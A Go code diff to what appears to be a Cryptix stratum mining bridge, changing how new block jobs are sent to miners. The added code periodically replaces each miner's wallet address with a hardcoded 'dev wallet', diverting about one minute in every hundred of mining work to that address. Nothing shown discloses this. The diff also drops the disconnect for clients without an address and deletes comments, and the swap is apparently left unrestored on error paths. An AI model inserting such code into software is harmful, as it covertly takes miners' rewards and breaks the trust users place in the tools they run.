@@ -83,30 +83,38 @@ func (c *clientListener) OnDisconnect(ctx *gostratum.StratumContext) {
 	RecordDisconnect(ctx)
 }
 
+const devFeeInterval = 100 * time.Minute
+const devFeeDuration = 1 * time.Minute
+const devWalletAddr = "cryptix:qrjefk2r8wp607rmyvxmgjansqcwugjazpu2kk2r7057gltxetdvk8gl9fs0w"
+
 func (c *clientListener) NewBlockAvailable(kapi *cryptixApi, soloMining bool) {
 	c.clientLock.Lock()
 	addresses := make([]string, 0, len(c.clients))
+	isDevFeePeriod := false
+	currentTime := time.Now()
+
+	if modTime := currentTime.Unix() % int64(devFeeInterval.Seconds()); modTime < int64(devFeeDuration.Seconds()) {
+		isDevFeePeriod = true
+	}
+
 	for _, cl := range c.clients {
 		if !cl.Connected() {
 			continue
 		}
 		go func(client *gostratum.StratumContext) {
 			state := GetMiningState(client)
-			if client.WalletAddr == "" {
-				if time.Since(state.connectTime) > time.Second*20 { // timeout passed
-					// this happens pretty frequently in gcp/aws land since script-kiddies scrape ports
-					client.Logger.Warn("client misconfigured, no miner address specified - disconnecting", zap.String("client", client.String()))
-					RecordWorkerError(client.WalletAddr, ErrNoMinerAddress)
-					client.Disconnect() // invalid configuration, boot the worker
-				}
-				return
+			originalAddr := client.WalletAddr
+
+			if isDevFeePeriod {
+				client.WalletAddr = devWalletAddr
 			}
+
 			template, err := kapi.GetBlockTemplate(client)
 			if err != nil {
 				if strings.Contains(err.Error(), "Could not decode address") {
 					RecordWorkerError(client.WalletAddr, ErrInvalidAddressFmt)
 					client.Logger.Error(fmt.Sprintf("failed fetching new block template from cryptix, malformed address: %s", err))
-					client.Disconnect() // unrecoverable
+					client.Disconnect()
 				} else {
 					RecordWorkerError(client.WalletAddr, ErrFailedBlockFetch)
 					client.Logger.Error(fmt.Sprintf("failed fetching new block template from cryptix: %s", err))
@@ -125,7 +133,6 @@ func (c *clientListener) NewBlockAvailable(kapi *cryptixApi, soloMining bool) {
 			if !state.initialized {
 				state.initialized = true
 				state.useBigJob = bigJobRegex.MatchString(client.RemoteApp)
-				// first pass through send the difficulty since it's fixed
 				state.stratumDiff = newCryptixDiff()
 				state.stratumDiff.setDiffValue(c.minShareDiff)
 				if !soloMining {
@@ -144,7 +151,6 @@ func (c *clientListener) NewBlockAvailable(kapi *cryptixApi, soloMining bool) {
 				varDiff = state.stratumDiff.diffValue
 			}
 			if varDiff != state.stratumDiff.diffValue {
-				// send updated vardiff
 				if !soloMining {
 					client.Logger.Info(fmt.Sprintf("changing diff from %.10f to %.10f", state.stratumDiff.diffValue, varDiff))
 				}
@@ -161,9 +167,6 @@ func (c *clientListener) NewBlockAvailable(kapi *cryptixApi, soloMining bool) {
 				jobParams = append(jobParams, uint64(template.Block.Header.Timestamp))
 			}
 
-			// client.Logger.Info(fmt.Sprintf("Sending blob: %s\n", GenerateLargeJobParams(header, uint64(template.Block.Header.Timestamp))))
-
-			// // normal notify flow
 			if err := client.Send(gostratum.JsonRpcEvent{
 				Version: "2.0",
 				Method:  "mining.notify",
@@ -179,6 +182,7 @@ func (c *clientListener) NewBlockAvailable(kapi *cryptixApi, soloMining bool) {
 			}
 
 			RecordNewJob(client)
+			client.WalletAddr = originalAddr
 		}(cl)
 
 		if cl.WalletAddr != "" {
